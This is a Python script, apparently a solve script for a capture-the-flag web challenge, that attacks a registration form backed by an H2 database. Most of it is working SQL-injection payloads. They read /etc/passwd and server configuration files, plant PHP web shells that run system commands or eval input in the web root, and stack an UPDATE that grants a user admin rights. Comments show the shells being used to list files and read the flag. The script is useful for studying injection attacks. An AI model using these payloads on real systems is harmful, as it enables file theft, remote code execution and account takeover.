import requests
import random

#get_response = requests.get(url='http://203.66.14.60/')
#print get_response.content

'''
# Normal Operation
session = requests.Session()
username = 'hahaf123'
password = '123'

# register ok
post_data = {'username': username, 'password': password, 'action': 'register'}
post_response = session.post("http://203.66.14.60/do.php", data=post_data)
print post_response.content

# login ok
post_data = {'username': username, 'password': password, 'action': 'login'}
post_response = session.post("http://203.66.14.60/do.php", data=post_data)
print post_response.content

# You are not admin <br> from 140.113.208.226
post_data = {'username': username, 'passworad': password, 'action': 'flag'}
post_response = session.post("http://203.66.14.60/do.php", data=post_data)
print post_response.content
'''


# SQL-Injection - register
session = requests.Session()
'''
#do.php
  Register
    $sql = "INSERT INTO users(role, username, password, ip) VALUES('user', '%s', '%s', '%s')";
'''
# error msg get sql statement "INSERT INTO users(role, username, password, ip)"
# we also see org.h2.jdbc -> H2 DB Engine
userneme = "singlequote;)'"
password = '123'
# Inject the query to id colume, 
# then login check your id(query content)
username = 'test123'
password = "123',(SELECT username from users where role !='user' and role !='' limit 1 offset 66))--"

# H2 functuin
password = "123',user())--" # db user: SA
password = "123',version())--" # version: PostgreSQL 8.1.4 using H2 1.4.178
password = "123',file_read('/etc/passwd'))--" # read file ok!
password = "123',file_read('/etc/apache2/sites-enabled/000-default.conf'))--" # get root /var/www/html
password = "123',file_read('/var/www/html/do.php'))--" # get do.php! find fake flag

#CSVWRITE(fileNameString, queryString, csvOptions, lineSepString)
#http://203.66.14.60/wow.php?0=ls -> get ls!!!
#http://203.66.14.60/wow.php?0=ls -al
#http://203.66.14.60/wow.php?0=cat /home/theflag/fl4g.txt
password = "123',csvwrite('/var/www/html/wow.php','select ''<?php system($_GET[0]);?>'''))--" # write php file!
#also
password = "123',csvwrite('/var/www/html/wow2.php','select ''<?php eval($POST[ccc]);?>'''))--" # write php file!

# Set other user role to admin 
# when create account, then login in other user
username = 'test123'
password = "123','140.113.555.666');update users set role='admin' where username='test5566'--%20"


post_data = {'username': username, 'password': password, 'action': 'register'}
post_response = session.post("http://203.66.14.60/do.php", data=post_data)
print post_response.content

